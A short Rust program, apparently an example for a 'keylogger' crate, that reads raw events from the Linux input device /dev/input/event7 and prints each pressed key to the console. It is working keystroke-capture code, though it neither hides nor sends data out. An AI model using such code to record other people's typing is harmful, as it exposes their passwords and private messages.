use std::fs::File;
use std::io::prelude::*;
use keylogger::InputEvent;

fn main() {
    let mut input = File::open("/dev/input/event7").expect("Input device 7 does not exist");
    let mut buffer : [u8; 24] = [0; 24];

    loop {
        while let Ok(()) = input.read_exact(&mut buffer) {
            let event: InputEvent = unsafe { std::mem::transmute(buffer) };

            if let Some(key) = event.key_pressed() {
                println!("{}", key);
            }
        }
    }
}
